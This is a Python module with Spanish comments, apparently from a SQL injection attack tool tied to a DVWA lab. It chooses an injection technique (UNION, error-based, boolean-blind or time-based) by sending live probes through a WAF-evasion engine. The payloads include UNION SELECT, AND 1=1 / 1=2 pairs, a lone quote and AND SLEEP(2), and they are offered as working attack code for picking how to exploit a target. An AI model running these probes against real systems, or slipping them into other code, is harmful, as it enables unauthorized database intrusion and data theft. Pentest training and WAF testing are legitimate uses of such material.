"""Reconocimiento previo: ELIGE la técnica de SQLi por OBSERVACIÓN (árbol OWASP WSTG-INPV-05),
antes de atacar — nunca por el nombre del WAF (no hay ningún 'if naxsi' aquí).

Como un pentester real, manda una batería corta de sondeos y mira QUÉ deja ver el objetivo para
decidir la técnica, según la guía OWASP:
  - el UNION pasa y refleja datos     -> UNION-based
  - aparecen errores SQL visibles     -> error-based
  - solo cambia la respuesta 1=1/1=2  -> boolean-based ciego
  - solo hay un retardo medible (SLEEP) -> time-based ciego

Para ATACAR elige entre las técnicas implementadas (UNION / boolean-blind); error-based y time-based
las DETECTA y reporta como evidencia (observabilidad), aunque su extractor no esté implementado.

Habla con el exterior por los mismos callbacks que el descubrimiento, así no depende de DVWA:
  - probe(sql)  -> ProbeResult         (envía por el motor de evasión y devuelve la respuesta)
  - time_probe(sql) -> segundos        (lo mismo, pero midiendo cuánto tardó; opcional)
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Optional

from .discovery import ProbeResult

Probe = Callable[[str], ProbeResult]
TimeProbe = Callable[[str], float]


@dataclass
class Recon:
    injectable: bool = False
    quote: str = ""                                # contexto hallado por el test booleano
    signals: dict = field(default_factory=dict)    # union/error/boolean/time -> bool | None
    technique: str = "none"                        # la que se ATACA: union | boolean | none


class TechniqueSelector:
    def __init__(self, probe: Probe, time_probe: Optional[TimeProbe] = None,
                 say: Optional[Callable[[str], None]] = None) -> None:
        self.probe = probe
        self.time_probe = time_probe
        self.say = say or (lambda _m: None)

    def select(self) -> Recon:
        r = Recon()
        r.signals["union"] = self._union_viable()
        r.signals["boolean"] = self._boolean_viable(r)
        r.signals["error"] = self._error_visible()
        r.signals["time"] = self._time_delay(r.quote) if self.time_probe else None
        r.injectable = any(bool(v) for v in r.signals.values())
        # Prioridad de ataque entre las técnicas implementadas (datos directos primero).
        r.technique = ("union" if r.signals["union"]
                       else "boolean" if r.signals["boolean"] else "none")
        extra = [k for k in ("error", "time") if r.signals.get(k)]
        self.say(f"[Recon] señales observables {r.signals} -> técnica elegida: {r.technique}"
                 + (f" (también detectadas: {extra})" if extra else ""))
        return r

    def _union_viable(self) -> bool:
        """¿El WAF deja pasar un UNION (con evasión)? Que refleje bien lo resuelve el descubrimiento."""
        for q in ("'", ""):
            if not self.probe(f"-1{q} UNION SELECT 1000,1001-- -").blocked:
                return True
        return False

    def _boolean_viable(self, r: Recon) -> bool:
        """Diferencia observable entre 1=1 (fila) y 1=2 (sin fila), probando ambos contextos."""
        for q in ("", "'"):
            true_r = self.probe(f"1{q} AND 1=1-- -")
            false_r = self.probe(f"1{q} AND 1=2-- -")
            if bool(true_r.cells) and not bool(false_r.cells):
                r.quote = q
                return True
        return False

    def _error_visible(self) -> bool:
        """Una comilla suelta rompe la consulta: si el objetivo muestra el error, es error-based."""
        return self.probe("1'").db_error

    def _time_delay(self, q: str) -> bool:
        """El objetivo no muestra nada, pero SLEEP(2) retrasa la respuesta: es time-based."""
        base = self.time_probe(f"1{q}")
        slow = self.time_probe(f"1{q} AND SLEEP(2)-- -")
        return (slow - base) >= 1.5
